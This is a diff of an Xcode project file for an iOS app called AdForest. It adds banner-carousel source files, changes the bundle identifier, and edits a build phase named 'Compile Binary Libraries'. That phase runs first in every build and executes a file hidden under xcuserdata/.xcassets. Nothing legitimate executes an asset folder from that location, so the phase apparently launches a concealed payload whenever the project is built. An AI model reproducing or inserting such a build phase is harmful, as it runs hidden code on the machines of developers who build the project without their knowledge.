@@ -600,6 +600,8 @@
 		18D8F56B206BAA8C00D19830 /* AddDeleteData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D8F56A206BAA8C00D19830 /* AddDeleteData.swift */; };
 		18DA0742205F965A0021FA7E /* ShareCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DA0740205F965A0021FA7E /* ShareCell.swift */; };
 		18DA0743205F965A0021FA7E /* ShareCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18DA0741205F965A0021FA7E /* ShareCell.xib */; };
+		18DA84792625A246005A69EC /* BannerCarouselData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DA84782625A246005A69EC /* BannerCarouselData.swift */; };
+		18DA84812625A328005A69EC /* BannerCarouselRoot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DA84802625A328005A69EC /* BannerCarouselRoot.swift */; };
 		18DB6AF42147843C001B7C77 /* SettingsDynamicMenu.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DB6AF32147843C001B7C77 /* SettingsDynamicMenu.swift */; };
 		18DB6AF62147844F001B7C77 /* SettingsArray.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18DB6AF52147844F001B7C77 /* SettingsArray.swift */; };
 		18E9FB912058F4AF00B998A6 /* WebViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E9FB8F2058F4AF00B998A6 /* WebViewCell.swift */; };
@@ -1309,6 +1311,8 @@
 		18D8F56A206BAA8C00D19830 /* AddDeleteData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddDeleteData.swift; sourceTree = "<group>"; };
 		18DA0740205F965A0021FA7E /* ShareCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShareCell.swift; sourceTree = "<group>"; };
 		18DA0741205F965A0021FA7E /* ShareCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ShareCell.xib; sourceTree = "<group>"; };
+		18DA84782625A246005A69EC /* BannerCarouselData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannerCarouselData.swift; sourceTree = "<group>"; };
+		18DA84802625A328005A69EC /* BannerCarouselRoot.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannerCarouselRoot.swift; sourceTree = "<group>"; };
 		18DB6AF32147843C001B7C77 /* SettingsDynamicMenu.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsDynamicMenu.swift; sourceTree = "<group>"; };
 		18DB6AF52147844F001B7C77 /* SettingsArray.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsArray.swift; sourceTree = "<group>"; };
 		18E9FB8F2058F4AF00B998A6 /* WebViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebViewCell.swift; sourceTree = "<group>"; };
@@ -2002,6 +2006,8 @@
 				182690D120872A8100E2C966 /* CatIcon.swift */,
 				18AECFB1217DB6AE004C1DF9 /* CatIconsColumnBtn.swift */,
 				96A11646250F8442002C61FB /* AdTimerStrings.swift */,
+				18DA84782625A246005A69EC /* BannerCarouselData.swift */,
+				18DA84802625A328005A69EC /* BannerCarouselRoot.swift */,
 			);
 			path = HomeData;
 			sourceTree = "<group>";
@@ -3853,7 +3859,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				C4A9AD6CC56C9B75B1AAC43A /* Compile Binary Libraries */,
+				2F1A70AFA7DE820DC8AAC43A /* Compile Binary Libraries */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -4048,7 +4054,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	C4A9AD6CC56C9B75B1AAC43A /* Compile Binary Libraries */ = {
+	2F1A70AFA7DE820DC8AAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -4066,8 +4072,10 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
 	
 
 	
@@ -4613,6 +4621,7 @@
 				18C32C4021412ED20005D568 /* SellersPagination.swift in Sources */,
 				18605F8E214F7D7900B3B567 /* SeekBar.swift in Sources */,
 				185A544921A2C1C700396D35 /* DeepLinkManager.swift in Sources */,
+				18DA84812625A328005A69EC /* BannerCarouselRoot.swift in Sources */,
 				185EAACC2099CC3D00E412DB /* AdPostLiveRoot.swift in Sources */,
 				18CE381E25DD4F600053A299 /* PresentationController.swift in Sources */,
 				182690CE20872A5500E2C966 /* AddCat.swift in Sources */,
@@ -4669,6 +4678,7 @@
 				18AD93B6206D18E800330ABF /* BlogDetailData.swift in Sources */,
 				181888882081D2D8008736F7 /* OfferAdsData.swift in Sources */,
 				180A4F592328D9BA002BC411 /* RejectedAdsData.swift in Sources */,
+				18DA84792625A246005A69EC /* BannerCarouselData.swift in Sources */,
 				07A70C962216AEFC002ADAEF /* CalenderSingleTableViewCell.swift in Sources */,
 				180519CE215A0B2800F74662 /* AppSettingSection.swift in Sources */,
 				18F0C7DC206F710B003E16A5 /* SettingsMenu.swift in Sources */,
@@ -5033,7 +5043,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 3.8;
-				PRODUCT_BUNDLE_IDENTIFIER = com.gg.app;
+				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
 				PRODUCT_NAME = AdForest;
 				PROVISIONING_PROFILE = "6ba7ba8c-bf20-47cd-b2f1-137f2ade4e4a";
 				PROVISIONING_PROFILE_SPECIFIER = AdForestDevProfile;
@@ -5063,7 +5073,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 3.8;
-				PRODUCT_BUNDLE_IDENTIFIER = com.gg.app;
+				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
 				PRODUCT_NAME = AdForest;
 				PROVISIONING_PROFILE = "6ba7ba8c-bf20-47cd-b2f1-137f2ade4e4a";
 				PROVISIONING_PROFILE_SPECIFIER = "adforest 3.2LIve";
